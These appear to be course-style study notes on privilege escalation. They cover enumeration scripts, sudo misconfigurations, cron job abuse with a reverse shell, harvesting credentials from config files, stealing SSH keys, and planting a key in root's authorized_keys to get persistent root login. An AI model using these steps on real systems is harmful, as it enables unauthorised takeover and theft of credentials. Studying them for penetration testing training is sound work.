### Checklist
* [Hacktricks](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist) has a very nice checklist to follow
* Also [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#checklists) is a good option

### Enumeration Scripts
* Linux
	* [LinEnum](https://github.com/rebootuser/LinEnum)
	* [LinuxPrivChecker](https://github.com/sleventyeleven/linuxprivchecker)
* Windows
	* [Seatbelt](https://github.com/GhostPack/Seatbelt)
	* [JAWS](https://github.com/411Hall/JAWS)
* [PEASS-ng](https://github.com/carlospolop/PEASS-ng)

```bash
./linpeas.sh
...SNIP...

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEYEND:
  RED/YELLOW: 99% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
  LightMangenta: Your username


====================================( Basic information )=====================================
OS: Linux version 3.9.0-73-generic
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
...SNIP...
```

### Kernel Exploits
* When encountering old systems
* Windows / Linux

### Vulnerable Software
* `dpkg -l` or look at the `C:\Program Files` 
* Search for public exploits

### User Privileges
* See what users have access to
	* Maybe we are allowed to run commands as root
* Check privileges

```bash
$ sudo -l

[sudo] password for user1:
...SNIP...

User user1 may run the following commands on ExampleServer:
    (ALL : ALL) ALL
```

```bash
$ sudo -l

    (user : user) NOPASSWD: /bin/echo
```

* `NOPASSWD` shows that we can execute `/bin/echo` without a password as user `user`

```bash
$ sudo -u user /bin/echo Hello World!

    Hello World!
```

* [GTFOBins](https://gtfobins.github.io/) contains a list of commands to exploit such binaries to get sudo privileges
	* The equivalent for [Windows](https://lolbas-project.github.io/#)

### Scheduled Tasks
* Windows and Linux offer scripts running at a specific time interval to carry out tasks
	* Anti-virus scans for example
* To take advantage of this
	1. Add new scheduled tasks/cron jobs
	2. Trick them to execute a malicious software
* Check if we are allowed to add new schedules
	* Linux
		* `Cron Jobs`
			1. `/etc/crontab`
			2. `/etc/cron.d`
			3. `/var/spool/cron/crontabs/root`
		* If we can write to a directory called by a cron job
			* Write a bash script with a reverse shell command
			* Cron will execute it

### Exposed Credentials
* Look for files we can read for any exposed credentials
	* Configs, logs, and user history (bash_history in Linux and PSReadLine in Windows)
* The enumeration scripts normally look for such files

```bash
...SNIP...
[+] Searching passwords in config PHP files
[+] Finding passwords inside logs (limit 70)
...SNIP...
/var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');
```

* Also when we find passwords, we should check for `password reuse`
	* password123

```bash
$ su -

Password: password123
whoami

root
```

### SSH Keys
* If we have read access over `.ssh` directory
	* We can gain the private/public key pair of a user
	* Copy it to our machine and use the `-i` parameter to log in with it

```bash
$ vim id_rsa
# Change the files permission or the server may prevent login on lax permissions
$ chmod 600 id_rsa
$ ssh user@10.10.10.10 -i id_rsa

root@remotehost#
```

* If we have write access to a users `/.ssh/` directory
	* Place our own public key in there
	* Only works if we already gained control over that user

```bash
$ ssh-keygen -f key

Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): *******
Enter same passphrase again: *******

Your identification has been saved in key
Your public key has been saved in key.pub
The key fingerprint is:
SHA256:...SNIP... user@parrot
The keys randomart image is:
+---[RSA 3072]----+
|   ..o.++.+      |
...SNIP...
|     . ..oo+.    |
+----[SHA256]-----+
```

* Copy the public key to `/root/.ssh/authorized_keys` 

```bash
$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
```

```bash
$ ssh root@10.10.10.10 -i key

root@remotehost#
```
